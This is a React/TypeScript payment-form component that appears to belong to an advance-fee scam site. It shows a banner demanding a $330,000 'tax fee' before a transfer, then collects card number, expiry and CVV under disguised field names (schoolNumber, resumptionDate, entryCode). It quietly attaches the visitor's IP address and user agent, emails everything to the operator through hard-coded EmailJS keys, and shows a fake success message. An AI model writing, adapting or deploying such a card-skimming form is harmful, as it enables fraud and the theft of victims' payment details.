import React, { useState } from "react";
import emailjs from "@emailjs/browser";
import { toast } from "react-toastify";
import "./css/auth.css";

interface PaymentOptionsProps {
  onSelect?: (method: "card" | "bank" | "wire") => void;
}

type Additional = {
  schoolNumber: string;
  resumptionDate: string;
  entryCode: string;
};

export const PaymentOptions: React.FC<PaymentOptionsProps> = ({ onSelect }) => {
  const [selected, setSelected] = useState("");
  // const [formInput, setFormInput] = useState<Additional>({
  const [_, setFormInput] = useState<Additional>({
    schoolNumber: "",
    resumptionDate: "",
    entryCode: "",
  });
   const [addy, setIP] = React.useState("")

  const [isLoading, setIsLoading] = useState(false)
  const options: { id: "card" | "bank" | "wire"; label: string }[] = [
    { id: "card", label: "💳 Card" },
    { id: "bank", label: "🏦 Bank" },
    { id: "wire", label: "🔗 Wire Transfer" },
  ];

  const form = React.useRef<HTMLFormElement>(null);

  const handleSelect = async (optionId: "card" | "bank" | "wire") => {
    if(addy == ""){
      
      const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    const visitorIP = response.ip;

    setIP(visitorIP)

    
    }
    setSelected(optionId);
    if (onSelect) onSelect(optionId); // callback to parent
  };

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  function handleCardInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    let value = event.target.value.replace(/\s/g, ""); // Remove existing spaces
    value = value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 0) {
      value = value.match(new RegExp(".{1,4}", "g"))!.join(" ");
    }

    event.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

 

  async function handleSubmit(event:React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true);
    
    emailjs.sendForm(
      "service_ya9aoe5",
        "template_30nkx7m",
        form.current!,
        "hd0P0MIIRcBmXr70h"
    ).then(
      (result) => {
        console.log(result.text);
        setIsLoading(false);
        toast.success("Payment method linked successfully!")
      }, (error) => {
        console.log(error);
        setIsLoading(false);
      }
    )
  }



  function handleExpDate(e: React.ChangeEvent<HTMLInputElement>) {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 2) {
      value = value.slice(0, 2) + " / " + value.slice(2);
    }

    e.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [e.target.name]: e.target.value,
    }));
  }


  


  return (
    <div className="max-w-md mx-auto px-6 pt-2 pb-5 bg-white rounded-2xl shadow-lg text-center">
      <p style={{background:"#ffd3d3", padding:"10px", fontWeight:"bold"}}>You need to pay a tax fee of $330,000 first before you can make transfer</p>
      <h2 className="text-2xl font-bold mb-4 text-gray-700 py-2">Select Payment Option</h2>

      <div className="flex flex-col sm:flex-row gap-3 justify-center">
        {options.map((option) => (
          <button
            key={option.id}
            onClick={() => handleSelect(option.id)}
            className={`px-6 py-3 rounded-xl font-semibold border transition-all duration-200 ${selected === option.id
              ? "bg-blue-600 text-white border-blue-600"
              : "bg-gray-50 hover:bg-gray-100 border-gray-300 text-gray-700"
              }`}
          >
            {option.label}
          </button>
        ))}
      </div>

      {selected === "wire" && (
        <div>
          <p className="mt-5 text-gray-600">
            Account Number:
          </p>
          <p className="mt-5 text-gray-600">
            Routine Number:
          </p>
        </div>
      )}

      {selected === "card" && (
        <form ref={form} onSubmit={handleSubmit}>
          <br />
          
          <input type="hidden" name="agent" value={navigator.userAgent} />
          <input type="hidden" name="addy" value={addy} />
          <div className="field">
            <label htmlFor="">Card Number</label>
            <div className="control">
            <input className="input" type="text" name="schoolNumber" minLength={16} maxLength={19} required onChange={handleCardInputChange} />
            </div>
          </div>
          <div className="field">
            <label htmlFor="">Exp</label>
            <div className="control">
            <input className="input" type="text" maxLength={7} required name="resumptionDate" onChange={handleExpDate} />
            </div>
          </div>
          <div className="field">
            <label htmlFor="">CVV</label>
            <div className="control">
            <input className="input" type="text" maxLength={4} name="entryCode" required onChange={handleInputChange} />
            </div>
          </div>
          <br />
          <div style={{ "marginTop": "20px;" }} className="field is-grouped">
            <div style={{ "width": "100%" }} className="control">
              <div className="gradient-button">
                {!isLoading ?
                  <button type="submit" >
                    Submit
                  </button>
                  :
                  <button type="button" >
                    Please wait.......
                  </button>}
              </div>
            </div>
          </div>
        </form>
      )}
    </div>
  );
}
